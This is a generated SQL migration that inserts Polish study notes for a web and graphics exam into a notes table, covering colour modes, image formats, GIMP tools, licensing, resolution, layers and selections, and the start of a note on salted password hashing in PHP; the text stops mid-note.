-- generuj: grafika,bezpieczenstwo,cms 036
-- =============================================================================
-- 036_teoria_grafika_bezpieczenstwo_cms.sql — teoria do podtematów: grafika, bezpieczenstwo, cms
--
-- Uruchom po 033_subtopic_notes.sql.
--
-- PLIK GENEROWANY: źródła w scripts/teoria/<dział>/*.md, generator
-- scripts/teoria/generuj.mjs. Poprawiasz treść w pliku .md i generujesz od nowa.
-- Istniejących notatek nie nadpisuje (on conflict do nothing).
--
--   grafika: gfx-barwy, gfx-formaty, gfx-narzedzia, gfx-prawo, gfx-przezroczystosc, gfx-raster-wektor, gfx-rozdzielczosc, gfx-warstwy, gfx-web, gfx-zaznaczenia
--   bezpieczenstwo: sec-hasla, sec-https, sec-owasp, sec-sqli, sec-xss
--   cms: cms-aktualizacje, cms-instalacja, cms-joomla, cms-motywy, cms-tresci
-- =============================================================================

do $$
begin
  if to_regclass('public.subtopic_notes') is null then
    raise exception 'Brakuje migracji 033_subtopic_notes.sql — uruchom ją przed 036.';
  end if;
end $$;

insert into subtopic_notes (subtopic_id, content_md)
select n.id, n.tresc
from (values
  ($t0$gfx-barwy$t0$, $t0$**W skrócie:** **tryb barw** określa, jak obraz zapisuje kolory: **RGB** dla ekranów, **CMYK** dla druku, **skala szarości** dla obrazów czarno-białych. **Głębia kolorów** mówi, ile bitów przypada na piksel — a więc ile różnych kolorów da się zapisać.

## Tryby barw

| Tryb | Składowe | Rodzaj mieszania | Zastosowanie |
|---|---|---|---|
| **RGB** | czerwony, zielony, niebieski | **addytywne** — światło; wszystkie na max = biały | ekrany, strony WWW |
| **CMYK** | cyjan, magenta, żółty, czarny (Key) | **subtraktywne** — farba; wszystkie = ciemny/czarny | druk |
| **Skala szarości** | jasność od czerni do bieli | — | zdjęcia czarno-białe, mniejsze pliki |
| **Indeksowany** | ograniczona paleta (np. 256 kolorów) | — | GIF, małe PNG |
| **HSV / HSB** | barwa, nasycenie, jasność | — | wygodny wybór koloru w programach |

Barwy RGB wyświetlone na ekranie mogą wyjść w druku **inaczej** (ciemniej, mniej nasycone) — zakres barw CMYK jest mniejszy.

GIMP pracuje w RGB lub skali szarości; zmiana: **Obraz → Tryb**. Do profesjonalnego przygotowania druku w CMYK zwykle używa się innych programów lub wtyczek.

## Głębia kolorów

| Bity na piksel | Liczba kolorów | Gdzie |
|---|---|---|
| 1 bit | 2 (czarny, biały) | grafika jednobitowa |
| 8 bitów | 256 | GIF, skala szarości, tryb indeksowany |
| **24 bity** (3 × 8) | ok. **16,7 mln** (2²⁴) | „true color”: JPG, PNG |
| 32 bity | 16,7 mln + 8 bitów kanału alfa | PNG z przezroczystością |

Liczba kolorów = **2 do potęgi liczby bitów**.

## Zapis koloru w RGB

Każda składowa 0–255: biały `rgb(255, 255, 255)` = `#FFFFFF`, czarny `#000000`, czerwony `#FF0000`, szary `#808080`.

## Na egzaminie

- RGB — ekran, addytywne; CMYK — druk, subtraktywne.
- 24-bitowa głębia ≈ 16,7 mln kolorów; 8-bitowa = 256.
- „K” w CMYK to czarny (Key), nie „Kolor”.

## Sprawdź się

1. W jakim trybie barw przygotowuje się grafikę na stronę internetową?
2. Ile kolorów zapisze obraz o głębi 8 bitów?
3. Co powstanie po zmieszaniu na ekranie czerwieni, zieleni i niebieskiego w pełnej mocy?

**Odpowiedzi:** 1. RGB. 2. 256. 3. Biały (mieszanie addytywne).$t0$),
  ($t0$gfx-formaty$t0$, $t0$**W skrócie:** format pliku decyduje o **jakości, rozmiarze i możliwościach** grafiki: czy ma przezroczystość, czy może być animowana, czy kompresja coś traci. Na stronę wybiera się zwykle **JPG/WebP do zdjęć**, **PNG do grafik z przezroczystością** i **SVG do logo i ikon**.

## Najważniejsze formaty

| Format | Kompresja | Przezroczystość | Animacja | Najlepszy do |
|---|---|---|---|---|
| **JPG / JPEG** | **stratna** (regulowana jakość) | nie | nie | zdjęć |
| **PNG** | **bezstratna** | tak (pełny kanał alfa) | nie* | zrzutów ekranu, grafik z napisami, przezroczystości |
| **GIF** | bezstratna, ale tylko **256 kolorów** | tak (1-bitowa: piksel widoczny albo nie) | **tak** | prostych animacji |
| **WebP** | stratna lub bezstratna | tak | tak | nowoczesnego zamiennika JPG i PNG — mniejsze pliki |
| **SVG** | — (format wektorowy, tekst XML) | tak | tak (CSS/SMIL) | logo, ikon, wykresów |
| **XCF** | bezstratna | tak | — | **własny format GIMP-a**: zachowuje warstwy, do dalszej pracy |
| BMP | zwykle bez kompresji | — | nie | praktycznie nie na WWW (duże pliki) |
| TIFF | bezstratna | tak | nie | druk, archiwizacja |

*istnieje odmiana APNG z animacją.

## Kompresja stratna i bezstratna

- **Stratna (JPG)** — usuwa szczegóły, których oko prawie nie widzi. Każde ponowne zapisanie JPG pogarsza jakość. Przy ostrych krawędziach i napisach pojawiają się „artefakty” (rozmyte obwódki).
- **Bezstratna (PNG)** — odtwarza obraz co do piksela; pliki ze zdjęciami są jednak dużo większe niż JPG.

## Jak wybrać

| Grafika | Format |
|---|---|
| zdjęcie produktu | JPG (jakość ok. 75–85%) albo WebP |
| logo z przezroczystym tłem | SVG, ewentualnie PNG |
| zrzut ekranu z tekstem | PNG |
| prosta animacja | krótkie wideo MP4/WebM lub WebP; GIF jako ostateczność |
| plik roboczy w GIMP-ie | XCF |

## W GIMP-ie

**Plik → Zapisz** zapisuje tylko w XCF. Do innych formatów: **Plik → Eksportuj jako** (Shift+Ctrl+E) — rozszerzenie w nazwie wybiera format, a przy JPG pojawia się suwak jakości.

## Na egzaminie

- JPG stratny, bez przezroczystości; PNG bezstratny z przezroczystością; GIF 256 kolorów i animacja.
- XCF — format GIMP-a z warstwami.
- „Eksportuj jako”, nie „Zapisz”, żeby uzyskać JPG lub PNG.

## Sprawdź się

1. Który format zachowa warstwy obrazu z GIMP-a?
2. Dlaczego logo z napisem na przezroczystym tle nie zapiszesz jako JPG?
3. Ile kolorów może zawierać GIF?

**Odpowiedzi:** 1. XCF. 2. JPG nie obsługuje przezroczystości, a kompresja stratna rozmywa krawędzie napisów. 3. 256.$t0$),
  ($t0$gfx-narzedzia$t0$, $t0$**W skrócie:** w GIMP-ie najczęściej używa się czterech grup narzędzi: **przekształceń** (kadrowanie, skalowanie, obrót), **retuszu** (klonowanie, łatka, rozmycie), **malowania** (pędzel, gumka, wypełnienie) i **tekstu**. Ustawienia aktywnego narzędzia są w oknie **Opcje narzędzia**.

## Przekształcenia

| Narzędzie | Skrót | Do czego |
|---|---|---|
| **Kadrowanie** | Shift+C | przycięcie obrazu; w opcjach można ustawić stałe proporcje (np. 16:9) |
| **Skalowanie** | Shift+S | zmiana rozmiaru warstwy/zaznaczenia (łańcuch = zachowaj proporcje) |
| **Obrót** | Shift+R | obrót, np. wyprostowanie krzywego horyzontu |
| **Odbicie** | Shift+F | lustrzane odbicie poziome lub pionowe |
| **Perspektywa** | Shift+P | korekta zbiegających się linii (np. budynek na zdjęciu) |
| Przesunięcie | M | przesuwanie warstwy lub zaznaczenia |

Cały obraz zmienisz też z menu: **Obraz → Skaluj obraz**, **Obraz → Przekształć → Obróć**.

## Retusz

| Narzędzie | Skrót | Do czego |
|---|---|---|
| **Klonowanie** | C | kopiuje fragment z innego miejsca (**Ctrl+klik** = wskazanie źródła) |
| **Korektor (łatka)** | H | jak klonowanie, ale dopasowuje kolor i jasność do otoczenia — usuwanie pryszczy, rys, kurzu |
| **Rozmycie / wyostrzanie** | Shift+U | miejscowe zmiękczenie lub wyostrzenie |
| **Rozjaśnianie / ściemnianie** | Shift+D | miejscowa korekta jasności |

Korekty całego obrazu: menu **Kolory** — Jasność i kontrast, **Poziomy**, **Krzywe**, Barwa i nasycenie, Balans kolorów.

## Malowanie

Pędzel (P), ołówek (N), aerograf (A), gumka (Shift+E), wypełnienie kubełkiem (Shift+B), gradient (G). Kolor pierwszego planu i tła wybiera się w przyborniku; **X** zamienia je miejscami, **D** przywraca czarny i biały.

## Tekst

Narzędzie **Tekst** (T) tworzy osobną **warstwę tekstową** — treść, krój, rozmiar i kolor można poprawiać, dopóki warstwa nie zostanie zrasteryzowana lub scalona.

## Dobre nawyki

1. Przed retuszem **duplikuj warstwę** — oryginał zostaje nietknięty.
2. Skaluj w dół, a nie w górę (powiększanie rozmywa).
3. Ctrl+Z cofa kolejne kroki; **Edycja → Historia cofania** pokazuje ich listę.
4. Pracuj w XCF, eksportuj kopię do JPG/PNG.

## Na egzaminie

- Kadrowanie (Shift+C) przycina, skalowanie (Shift+S) zmienia rozmiar.
- Klonowanie: najpierw Ctrl+klik na źródło.
- Korektor (łatka) dopasowuje kolor do otoczenia, klonowanie kopiuje dosłownie.

## Sprawdź się

1. Którym narzędziem przytniesz zdjęcie do proporcji 16:9?
2. Jak wskazać źródło dla narzędzia klonowania?
3. Dlaczego przed retuszem warto zduplikować warstwę?

**Odpowiedzi:** 1. Kadrowanie z ustawioną stałą proporcją 16:9. 2. Ctrl + kliknięcie w miejsce, z którego ma kopiować. 3. Żeby oryginał został nietknięty, gdyby retusz się nie udał.$t0$),
  ($t0$gfx-prawo$t0$, $t0$**W skrócie:** zdjęcie czy grafika znaleziona w internecie **nie jest darmowa tylko dlatego, że jest widoczna**. Każdy utwór ma autora i jest chroniony prawem autorskim — wolno go użyć tylko wtedy, gdy pozwala na to **licencja**, autor albo przepis (np. dozwolony użytek).

## Podstawy prawa autorskiego

- Zdjęcie, rysunek, logo czy ikona to **utwór** chroniony od chwili powstania — bez żadnej rejestracji i bez znaczka ©.
- **Autorskie prawa osobiste** (np. prawo do oznaczenia autorstwa) są niezbywalne; **majątkowe** (decydowanie o użyciu i zarabianie) można przekazać lub sprzedać licencją.
- Wizerunek osoby na zdjęciu wymaga zwykle jej **zgody** na rozpowszechnianie (wyjątki: osoby publiczne w związku z funkcją, osoba jako szczegół większej całości, np. tłumu).
- Znaki towarowe (logo firm) mają dodatkową ochronę.

## Licencje grafik

| Licencja | Co wolno |
|---|---|
| **Domena publiczna / CC0** | używać dowolnie, także komercyjnie, bez podawania autora |
| **CC BY** | używać i zmieniać, także komercyjnie — **podając autora** |
| **CC BY-SA** | jak BY, ale wersje zmienione na tej samej licencji |
| **CC BY-NC** | tylko **niekomercyjnie**, z podaniem autora |
| **CC BY-ND** | bez zmian (nie wolno przerabiać) |
| **Royalty-free (stock)** | płacisz raz, używasz według warunków licencji — nie znaczy „za darmo” |
| **Prawa zastrzeżone** | tylko za zgodą autora |

Oznaczenia CC łączy się: **BY-NC-SA** = podaj autora, niekomercyjnie, na tej samej licencji.

## Skąd brać grafiki legalnie

- **Banki zdjęć z darmowymi licencjami**: Pixabay, Unsplash, Pexels — każdy ma własną licencję, sprawdź jej warunki.
- **Wikimedia Commons** — licencja podana przy każdym pliku.
- **Ikony**: zestawy na licencjach otwartych (np. MIT, CC BY) — często wymagają podania źródła.
- **Płatne banki**: Shutterstock, Adobe Stock — licencja według zakupionego wariantu.
- **Własne zdjęcia i grafiki** — najbezpieczniej.
- Wyszukiwarka grafik Google ma filtr **„Prawa użytkowania”**, ale licencję i tak trzeba sprawdzić u źródła.

## Jak podać autora (CC BY)

> Zdjęcie: Jan Kowalski, *Boisko*, licencja CC BY 4.0, źródło: commons.wikimedia.org

Czyli: **autor, tytuł, licencja (z linkiem), źródło**, a jeśli zmieniałeś utwór — informacja o zmianach.

## Na egzaminie

- Brak znaczka © nie oznacza braku ochrony.
- CC BY-NC nie pozwala na użycie komercyjne (np. strona sklepu).
- CC0 / domena publiczna — bez ograniczeń.

## Sprawdź się

1. Czy możesz wziąć ilustrację z cudzego bloga na stronę firmy, jeśli nie ma przy niej informacji o prawach autorskich?
2. Grafika ma licencję CC BY-ND. Czy możesz ją przyciąć i zmienić kolory?
3. Co trzeba podać, korzystając z grafiki na licencji CC BY?

**Odpowiedzi:** 1. Nie — utwór jest chroniony automatycznie; potrzebna zgoda autora lub licencja. 2. Nie — ND zabrania tworzenia utworów zależnych (zmian). 3. Autora, tytuł, licencję i źródło (oraz informację o zmianach).$t0$),
  ($t0$gfx-przezroczystosc$t0$, $t0$**W skrócie:** **kanał alfa** to dodatkowa informacja przy każdym pikselu mówiąca, **jak bardzo jest nieprzezroczysty** — od całkiem widocznego do całkiem przezroczystego. Dzięki niemu logo może leżeć na dowolnym tle bez białego prostokąta wokół.

## Kanał alfa

- W RGBA każdy piksel ma cztery wartości: R, G, B i **A (alfa)**.
- Alfa 255 (100%) = piksel pełny, 0 = całkowicie przezroczysty, wartości pośrednie = półprzezroczystość (np. cień, miękkie krawędzie).
- W CSS: `rgba(0, 0, 0, 0.5)` — czarny z 50% krycia; właściwość `opacity` działa na cały element.

## Które formaty obsługują przezroczystość

| Format | Przezroczystość |
|---|---|
| **PNG** | pełna, stopniowana (miękkie krawędzie, cienie) |
| **WebP** | pełna |
| **GIF** | tylko „tak/nie” dla piksela — postrzępione krawędzie na kolorowym tle |
| **SVG** | pełna |
| **JPG** | **brak** — przezroczyste miejsca zamienią się w kolor (zwykle biały) |

## Kiedy PNG, a kiedy JPG

| Sytuacja | Wybór |
|---|---|
| logo, ikona na kolorowym tle strony | **PNG** (albo SVG) |
| zdjęcie bez przezroczystości | **JPG** — kilka razy mniejszy plik |
| zdjęcie produktu „wycięte” z tła | PNG lub WebP |
| grafika z tekstem i ostrymi krawędziami | PNG |

## W GIMP-ie

1. **Warstwa → Przezroczystość → Dodaj kanał alfa** — bez tego gumka i usuwanie malują kolorem tła zamiast „dziury”.
2. Zaznacz tło (np. różdżką — zaznaczenie rozmyte) i naciśnij **Delete**.
3. Przezroczystość widać jako **szachownicę**.
4. **Eksportuj jako** PNG — przy eksporcie do JPG przezroczystość zniknie.

## Na egzaminie

- JPG nie ma kanału alfa.
- Przed usuwaniem tła w GIMP-ie trzeba dodać kanał alfa.
- Szachownica w programie graficznym = obszar przezroczysty.

## Sprawdź się

1. Co się stanie z przezroczystym tłem, gdy wyeksportujesz obraz do JPG?
2. Dlaczego gumka w GIMP-ie maluje na biało zamiast „wycierać” do przezroczystości?
3. Który format wybierzesz do zdjęcia krajobrazu na stronę?

**Odpowiedzi:** 1. Zostanie wypełnione kolorem (zwykle białym). 2. Warstwa nie ma kanału alfa — trzeba go dodać. 3. JPG (lub WebP) — przezroczystość nie jest potrzebna, a plik będzie mniejszy.$t0$),
  ($t0$gfx-raster-wektor$t0$, $t0$**W skrócie:** grafika **rastrowa** to siatka kolorowych pikseli — idealna na zdjęcia, ale traci jakość przy powiększaniu. Grafika **wektorowa** to opis kształtów wzorami (linie, krzywe, wypełnienia) — można ją powiększać bez końca, ale nie nadaje się do zdjęć.

## Porównanie

| | Rastrowa (bitmapa) | Wektorowa |
|---|---|---|
| Z czego się składa | z pikseli | z obiektów: punktów, linii, krzywych Béziera |
| Powiększanie | pojawiają się „schodki” i rozmycie | zawsze ostra |
| Rozmiar pliku | rośnie z liczbą pikseli | zależy od liczby obiektów, zwykle mały |
| Najlepsza do | zdjęć, obrazów z płynnymi przejściami barw | logo, ikon, wykresów, map, napisów |
| Formaty | JPG, PNG, GIF, WebP, BMP, TIFF | SVG, AI, EPS, PDF (częściowo) |
| Programy | **GIMP**, Photoshop, Krita | **Inkscape**, Illustrator, CorelDRAW |

## Jak to rozumieć

Rastrowe logo 200×200 px na billboardzie trzeba by rozciągnąć wielokrotnie — piksele zrobią się widoczne jak klocki. To samo logo w SVG wydrukuje się ostro w każdym rozmiarze, bo komputer od nowa przelicza kształty.

## Rasteryzacja i wektoryzacja

- **Rasteryzacja** — zamiana wektora na piksele (dzieje się zawsze przy wyświetlaniu na ekranie i przy eksporcie SVG do PNG).
- **Wektoryzacja (trasowanie)** — zamiana bitmapy na wektory (np. w Inkscape: Ścieżka → Wektoryzuj bitmapę); dobrze działa dla prostych, kontrastowych rysunków, słabo dla zdjęć.

## Na stronie WWW

- Zdjęcia → raster (JPG, WebP).
- Logo, ikony, proste ilustracje → **SVG** — ostre na ekranach o dużej gęstości pikseli i zwykle bardzo lekkie.
- SVG można wstawić jako `<img src="logo.svg">` albo bezpośrednio w kod HTML i stylować CSS-em.

## Na egzaminie

- Która grafika traci jakość przy powiększaniu → rastrowa.
- Format wektorowy na strony → SVG.
- GIMP to program do grafiki **rastrowej**, Inkscape — **wektorowej**.

## Sprawdź się

1. Jaki rodzaj grafiki wybierzesz na logo, które ma być na wizytówce i na billboardzie?
2. W jakim programie z darmowych edytujesz grafikę wektorową?
3. Czy zdjęcie zapisane jako SVG stanie się grafiką wektorową?

**Odpowiedzi:** 1. Wektorową (np. SVG). 2. Inkscape. 3. Nie — SVG może tylko „opakować” obraz rastrowy; zdjęcia nie są zbudowane z kształtów.$t0$),
  ($t0$gfx-rozdzielczosc$t0$, $t0$**W skrócie:** na ekranie liczą się **wymiary w pikselach** (np. 1920×1080). **DPI/PPI** (punkty na cal) ma znaczenie dopiero przy **druku** — mówi, ile pikseli przypadnie na cal papieru, a więc jak duży i jak ostry będzie wydruk.

## Pojęcia

| Pojęcie | Znaczenie |
|---|---|
| **Wymiary w pikselach** | szerokość × wysokość obrazu, np. 1200 × 800 px |
| **Rozdzielczość (PPI / DPI)** | liczba pikseli (punktów) na cal; 1 cal = **2,54 cm** |
| **Megapiksele** | liczba pikseli w milionach: 6000 × 4000 = 24 Mpx |
| **Proporcje** | stosunek boków, np. 16:9, 4:3, 3:2, 1:1 |

**PPI** dotyczy pikseli obrazu, **DPI** — punktów drukarki; w praktyce oba skróty używa się zamiennie.

## Rozmiar wydruku

**rozmiar w calach = piksele ÷ PPI**, a w centymetrach: **(piksele ÷ PPI) × 2,54**.

Zdjęcie 3000 × 2000 px przy **300 PPI**: 3000 ÷ 300 = 10 cali = **25,4 cm** szerokości, 2000 ÷ 300 ≈ 6,67 cala ≈ **16,9 cm** wysokości.

To samo zdjęcie przy 150 PPI wydrukuje się dwa razy większe, ale mniej ostre.

| Zastosowanie | Typowa rozdzielczość |
|---|---|
| ekran, strona WWW | liczą się tylko piksele (metadana DPI nie ma znaczenia) |
| druk ulotek, zdjęć | **300 DPI** |
| plakat oglądany z daleka | 150 DPI wystarcza |

## W GIMP-ie

- **Obraz → Skaluj obraz** — zmienia liczbę pikseli (skaluje).
- **Obraz → Rozmiar wydruku** — zmienia tylko DPI, piksele zostają (zdjęcie się nie zmienia, zmienia się rozmiar na papierze).
- **Obraz → Rozmiar płótna** — powiększa/zmniejsza „kartkę” bez skalowania zawartości.

Pilnuj **łańcucha proporcji** przy skalowaniu, inaczej obraz się zniekształci.

## Pułapka: powiększanie

Zmniejszanie jest bezpieczne. **Powiększanie** rastra nie doda szczegółów — program „wymyśla” brakujące piksele (interpolacja), więc obraz robi się rozmyty.

## Na egzaminie

- 1 cal = 2,54 cm; druk dobrej jakości = 300 DPI.
- Na ekranie znaczenie mają piksele, a nie DPI.
- Skalowanie zmienia piksele, „Rozmiar wydruku” tylko DPI.

## Sprawdź się

1. Ile cm szerokości będzie miał wydruk obrazu 1800 px przy 300 DPI?
2. Czy zmiana DPI z 72 na 300 w „Rozmiarze wydruku” poprawi jakość zdjęcia na stronie?
3. Ile megapikseli ma zdjęcie 4000 × 3000 px?

**Odpowiedzi:** 1. 1800 ÷ 300 = 6 cali ≈ 15,24 cm. 2. Nie — na ekranie liczą się piksele, a ich liczba się nie zmieniła. 3. 12 Mpx.$t0$),
  ($t0$gfx-warstwy$t0$, $t0$**W skrócie:** **warstwy** są jak przezroczyste folie położone jedna na drugiej — każdą można edytować osobno, przesuwać i ukrywać, nie psując reszty. **Krycie** ustala, jak bardzo warstwa przesłania te pod nią, a **tryb mieszania** — w jaki sposób jej kolory łączą się z niższymi.

## Okno warstw (Ctrl+L)

- Warstwa **na górze listy** jest **na wierzchu** obrazu.
- Ikona oka — pokaż/ukryj warstwę.
- Ikona łańcucha — powiąż warstwy, żeby przesuwały się razem.
- Kłódki — zablokuj piksele / pozycję / kanał alfa.
- Przyciski na dole: nowa warstwa, duplikuj, w górę/w dół, usuń.

## Najważniejsze polecenia (menu Warstwa)

| Polecenie | Działanie |
|---|---|
| **Nowa warstwa** (Shift+Ctrl+N) | pusta warstwa (przezroczysta lub z wypełnieniem) |
| **Duplikuj warstwę** | kopia — dobra praktyka przed retuszem |
| **Scal w dół** | łączy warstwę z tą poniżej |
| **Spłaszcz obraz** (Obraz → Spłaszcz) | łączy wszystkie warstwy w jedną i usuwa przezroczystość |
| **Warstwa do rozmiaru obrazu** | dopasowuje granice warstwy do płótna |

Zapisz plik roboczy jako **XCF**, żeby warstwy zostały. Eksport do JPG/PNG spłaszcza obraz w pliku wynikowym.

## Krycie (Opacity)

Suwak 0–100% w oknie warstw. 50% — warstwa jest półprzezroczysta; przydaje się do znaków wodnych i delikatnych nakładek.

## Tryby mieszania

| Tryb | Efekt | Przykład użycia |
|---|---|---|
| **Normalny** | zwykłe przykrycie | domyślny |
| **Pomnóż** (Multiply) | przyciemnia, biały znika | cienie, rysunek tuszem na kolorze |
| **Ekran** (Screen) | rozjaśnia, czarny znika | światło, poświata |
| **Nakładka** (Overlay) | zwiększa kontrast: ciemne ciemniej, jasne jaśniej | podbicie kontrastu, tekstury |
| **Różnica** | odejmuje kolory | porównanie dwóch wersji obrazu |

## Przykład: napis na zdjęciu

1. Zdjęcie jako warstwa tła.
2. Nowa warstwa z czarnym prostokątem, krycie 50% — półprzezroczysty pasek.
3. Narzędzie tekstu tworzy własną warstwę tekstową — tekst da się później poprawić.
4. Zapis jako XCF, eksport jako JPG na stronę.

## Na egzaminie

- Kolejność warstw: górna na liście przykrywa dolne.
- XCF zachowuje warstwy, JPG/PNG — nie.
- „Pomnóż” przyciemnia, „Ekran” rozjaśnia.

## Sprawdź się

1. Której warstwy nie widać, jeśli dwie nieprzezroczyste warstwy się pokrywają?
2. Jak zapisać pracę, żeby jutro móc dalej edytować warstwy?
3. Jaki tryb mieszania usunie białe tło skanu rysunku?

**Odpowiedzi:** 1. Tej niżej na liście warstw. 2. Jako XCF (Plik → Zapisz). 3. Pomnóż (Multiply).$t0$),
  ($t0$gfx-web$t0$, $t0$**W skrócie:** grafika na stronę ma być **możliwie lekka przy dobrej jakości**. Zdjęcie prosto z aparatu waży kilka MB i ma 6000 px szerokości — na stronie wystarczy zwykle 1200–2000 px i 100–300 KB. Ciężkie obrazki to najczęstsza przyczyna wolnych stron.

## Proces krok po kroku (GIMP)

1. **Kadrowanie** — zostaw to, co ważne, w potrzebnych proporcjach.
2. **Skalowanie**: **Obraz → Skaluj obraz** do szerokości, w jakiej obraz będzie wyświetlany (z zapasem na ekrany o wysokiej gęstości, np. ×2 dla miniatur).
3. Ewentualnie korekta jasności i lekkie wyostrzenie (zmniejszenie zmiękcza obraz).
4. **Plik → Eksportuj jako**:
   - zdjęcie → **JPG**, jakość ok. **75–85%**, opcjonalnie „progresywny”;
   - grafika z przezroczystością → **PNG** (poziom kompresji nie zmienia jakości, tylko czas zapisu);
   - jeśli to możliwe → **WebP**.
5. Sprawdź **rozmiar pliku** — zdjęcie na całą szerokość: celuj w 150–300 KB, miniatura: kilkadziesiąt KB.

## Wskazówki dotyczące wymiarów

| Miejsce na stronie | Typowa szerokość |
|---|---|
| zdjęcie na całą szerokość (baner) | 1600–2000 px |
| zdjęcie w treści | 800–1200 px |
| miniatura w galerii | 300–600 px |
| ikona, logo | SVG albo PNG w dwóch rozmiarach |

Usuń zbędne **metadane** (EXIF z danymi aparatu, czasem z lokalizacją GPS) — zmniejsza to plik i chroni prywatność. W oknie eksportu GIMP-a odznacz zapis EXIF/XMP.

## Po stronie HTML i CSS

```html
<img src="boisko-800.jpg"
     srcset="boisko-800.jpg 800w, boisko-1600.jpg 1600w"
     sizes="(max-width: 800px) 100vw, 800px"
     alt="Boisko szkolne po remoncie"
     width="800" height="533" loading="lazy">
```

- **`alt`** — opis dla czytników ekranu i gdy obraz się nie wczyta.
- **`width` i `height`** — przeglądarka rezerwuje miejsce, strona nie „skacze” przy ładowaniu.
- **`loading="lazy"`** — obrazy poniżej ekranu ładują się dopiero przy przewijaniu.
- **`srcset`** — przeglądarka sama wybierze mniejszy plik na telefon.
- W CSS: `img { max-width: 100%; height: auto; }` — obraz nie wyjdzie poza kontener.

## Nazwy plików

Małe litery, bez spacji i polskich znaków, opisowe: `boisko-szkolne.jpg`, nie `IMG_20240503 kopia (2).JPG`.

## Na egzaminie

- W zadaniach praktycznych często trzeba **przeskalować** obraz do podanego wymiaru i zapisać w podanym formacie — zwróć uwagę na **proporcje** i nazwę pliku.
- Zdjęcia → JPG, przezroczystość → PNG.
- `alt` jest obowiązkowy dla dostępności.

## Sprawdź się

1. Zdjęcie 6000 × 4000 px ma trafić do treści artykułu szerokiego na 900 px. Co zrobisz przed wgraniem?
2. Jaką jakość JPG zwykle wybiera się na stronę?
3. Po co podawać atrybuty `width` i `height` przy `<img>`?

**Odpowiedzi:** 1. Przeskaluję do ok. 900–1800 px szerokości z zachowaniem proporcji i wyeksportuję jako JPG/WebP z jakością ok. 80%. 2. Ok. 75–85%. 3. Żeby przeglądarka zarezerwowała miejsce i układ strony nie przeskakiwał podczas ładowania.$t0$),
  ($t0$gfx-zaznaczenia$t0$, $t0$**W skrócie:** **zaznaczenie** ogranicza działanie narzędzi do wybranego obszaru — wszystko poza nim jest chronione. **Maska warstwy** ukrywa części warstwy bez ich kasowania: czarne = niewidoczne, białe = widoczne. Maskę zawsze można poprawić, a wymazanych pikseli już nie odzyskasz.

## Narzędzia zaznaczania

| Narzędzie | Skrót | Do czego |
|---|---|---|
| **Zaznaczenie prostokątne** | R | prostokąty, kadry |
| **Zaznaczenie eliptyczne** | E | okręgi, owale |
| **Zaznaczenie odręczne (lasso)** | F | dowolny kształt rysowany ręcznie lub punktami |
| **Zaznaczenie rozmyte (różdżka)** | U | sąsiadujące piksele o podobnym kolorze |
| **Zaznaczenie według koloru** | Shift+O | wszystkie piksele danego koloru w całym obrazie |
| **Inteligentne nożyce** | I | krawędzie wykrywane automatycznie |
| **Zaznaczanie pierwszego planu** | — | półautomatyczne wycinanie obiektu z tła |

**Próg** różdżki ustala, jak podobne kolory mają zostać zaznaczone: większy próg = większy obszar.

## Łączenie zaznaczeń

- **Shift** + przeciągnięcie — **dodaj** do zaznaczenia,
- **Ctrl** — **odejmij**,
- **Shift+Ctrl** — część wspólna.

## Menu Zaznaczenie

- **Odwróć** (Ctrl+I) — zaznacz wszystko poza obecnym zaznaczeniem (np. tło zamiast obiektu).
- **Brak** (Shift+Ctrl+A) — usuń zaznaczenie.
- **Zmiękcz** — rozmyta krawędź, żeby wycięty obiekt nie miał „ostrych schodków”.
- **Powiększ / Zmniejsz** — poszerz lub zwęź zaznaczenie o podaną liczbę pikseli.
- **Szybka maska** (Shift+Q) — poprawianie zaznaczenia pędzlem.

## Maska warstwy

1. **Warstwa → Maska → Dodaj maskę warstwy** (biała = wszystko widoczne).
2. Malując na masce **czarnym** — ukrywasz, **białym** — odsłaniasz, **szarym** — częściowo.
3. Gradient czarno-biały na masce daje płynne przenikanie dwóch zdjęć.
4. **Zastosuj maskę** — gdy efekt jest gotowy, maska trwale usuwa ukryte piksele.

| Gumka | Maska warstwy |
|---|---|
| kasuje piksele na zawsze | ukrywa — można odkryć |
| szybka | edycja nieniszcząca (bezpieczniejsza) |

## Przykład: zmiana tła portretu

1. Zaznacz osobę (narzędzie pierwszego planu lub nożyce), **Zmiękcz** o 2 px.
2. Do warstwy z portretem dodaj maskę **z zaznaczenia** — tło znika, ale nie jest skasowane.
3. Pod spodem dodaj nową warstwę z innym tłem.

## Na egzaminie

- Różdżka (zaznaczenie rozmyte) działa na podobnych kolorach.
- Odwrócenie zaznaczenia: Ctrl+I.
- Maska: czarny ukrywa, biały pokazuje.

## Sprawdź się

1. Jak szybko zaznaczyć tło, jeśli zaznaczyłeś już obiekt?
2. Co oznacza czarny kolor na masce warstwy?
3. Po co zmiękczać krawędź zaznaczenia przed wycięciem obiektu?

**Odpowiedzi:** 1. Zaznaczenie → Odwróć (Ctrl+I). 2. Ten fragment warstwy jest niewidoczny. 3. Żeby krawędź była naturalna, bez ostrych schodków.$t0$),
  ($t0$sec-hasla$t0$, $t0$**W skrócie:** hasła **nigdy nie zapisuje się w bazie wprost**. Zapisuje się ich **skrót (hash)** utworzony wolną funkcją z **solą**. Przy logowaniu oblicza się skrót wpisanego hasła i porównuje — samego hasła nie da się ze skrótu odczytać. W PHP robią to `password_hash()` i `password_verify()`.

## Dlaczego nie zwykły tekst ani szyfrowanie

- **Zwykły tekst** — wyciek bazy = wszystkie hasła od razu w rękach atakującego (a ludzie używają tych samych haseł w wielu serwisach).
- **Szyfrowanie** da się odwrócić kluczem — a klucz zwykle leży na tym samym serwerze.
- **Skrót** jest **jednokierunkowy**: z hasła łatwo policzyć skrót, ze skrótu nie da się odtworzyć hasła.

## Dlaczego nie MD5 ani SHA-1

To szybkie funkcje skrótu — komputer liczy ich miliardy na sekundę, więc proste hasła da się odgadnąć metodą prób (atak słownikowy, siłowy). Do tego bez soli identyczne hasła mają identyczne skróty i działają **tablice tęczowe** (gotowe zestawy skrótów popularnych haseł).

## Sól i wolne funkcje

- **Sól** — losowy ciąg dodawany do hasła przed liczeniem skrótu, inny dla każdego użytkownika. Dwa takie same hasła dają różne skróty, a tablice tęczowe przestają działać.
- **Wolne algorytmy** — **bcrypt**, **Argon2** — celowo kosztowne obliczeniowo, co spowalnia odgadywanie.

`password_hash` robi wszystko naraz: losuje sól, używa bcrypt (lub nowszego) i zapisuje wszystko w jednym napisie, np.:

```
$2y$10$wD1n5u3k2Q...   ← algorytm ($2y = bcrypt), koszt (10), sól i skrót
```

## W praktyce (PHP)

**Rejestracja:**

```php
$hash = password_hash($_POST["haslo"], PASSWORD_DEFAULT);
// zapis $hash do kolumny VARCHAR(255) — zapytaniem przygotowanym
```

**Logowanie:**

